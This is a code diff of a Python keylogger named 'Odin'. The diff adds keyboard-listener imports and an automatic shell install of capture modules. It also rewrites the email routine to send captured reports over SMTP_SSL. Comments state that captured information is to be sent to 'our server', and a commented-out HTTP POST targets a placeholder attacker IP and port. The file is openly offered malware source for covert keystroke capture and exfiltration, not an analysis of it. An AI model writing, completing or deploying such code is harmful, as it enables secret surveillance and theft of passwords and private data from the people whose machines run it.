@@ -14,8 +14,22 @@ from select import select
 from sys import modules
 from turtle import onclick, onkeypress
 from typing_extensions import Self
-
-
+import os
+from pynput import keyboard
+import logging
+import platform
+import socket
+import wave
+from pynput.keyboard import Key, Listener
+import glob
+import threading
+import smtplib
+import requests
+import json
+import smtplib
+import ssl
+from email.message import EmailMessage
+"""
 try:            # <-- Using "try-except" at the start helps the user not to download every module one by one.
     import os
     from pynput import keyboard
@@ -23,7 +37,7 @@ try:            # <-- Using "try-except" at the start helps the user not to down
     import platform
     import socket
     import wave
-    from pynput.keyboard import Listener
+    from pynput.keyboard import Key, Listener
     import glob
     import threading
     import smtplib
@@ -44,9 +58,9 @@ try:            # <-- Using "try-except" at the start helps the user not to down
 except ModuleNotFoundError:
     from subprocess import call
     modules = ["pyscreenshot" , "soundddevice" , "pynput"]
-    call("pip install " + ' '.join(modules) , shell=True) 
+    call("pip3       install " + ' '.join(modules) , shell=True) 
 
-
+"""
 #               <--------   ----  ODIN M1  ----   -------->
 
 # Forming a variable for the captured information. We will send this to our server.
@@ -54,11 +68,11 @@ captured_info = ''
 
 
 
-
+"""
 # Server Specifications
 ip_address = "ip.ip.ip.ip"
 port_number_value = "8080"
-
+"""
 # Time interval for the program. Based on seconds.
 time_interval_value = 10
 
@@ -87,7 +101,7 @@ def send_info_req_swside():
 
 
             # Values of ip_address and port number
-            r = requests.post(f"https//{ip_address}:{port_number_value}" , data=payload , headers={"Content-Type" : "application/json"})
+            #r = requests.post(f"https//{ip_address}:{port_number_value}" , data=payload , headers={"Content-Type" : "application/json"})
 
 
 
@@ -117,8 +131,11 @@ def send_info_req_swside():
 
 # Classing Keylogger Odin
 
-EMAIL_ADDRESS = "example@protonmail.com"     # <--- WILL BE UPDATED!!!
-EMAIL_PASSWORD = "example@protonmail.com"
+EMAIL_ADDRESS = ""     # <--- WILL BE UPDATED!!!
+EMAIL_PASSWORD = "" #<---- WILL BE DELETE
+EMAIL_RECEIVER= ""
+global port 
+port = 465 
 SEND_REPORT_EVERY_BASED_ON_SCNDS = "60"
 
 
@@ -199,8 +216,8 @@ class KeyloggerOdin:
     # Send Email Function
     
     def send_mail_section(self , email , password , message):
-        sender = "Private Person <example@protonmail.com>"
-        receiver = "Private Receiver <example@protonmail.com>"
+        sender = EMAIL_ADDRESS
+        receiver = EMAIL_RECEIVER
 
         # There is an ongoing error with mail server, will be fixed with an update.
 
@@ -211,10 +228,11 @@ class KeyloggerOdin:
         
         Odin Keylogger - by the Department of Defense of Erwinium\n """
 
+        context = ssl.create_default_context()
         mail += message
-        with smtplib.SMTP("127.0.0.1" , 1025) as server:      # 1025 is the port value and 127.0.0.1 is the IP for the protonmail.com
-            server.login(email , password)
-            server.sendmail(sender , receiver , message)
+        with smtplib.SMTP_SSL('', port, context=context) as smtp:      # 1025 is the port value and 127.0.0.1 is the IP for the protonmail.com
+            smtp.login(EMAIL_ADDRESS , EMAIL_PASSWORD)
+            smtp.sendmail(EMAIL_ADDRESS , EMAIL_RECEIVER , message)
 
 
 
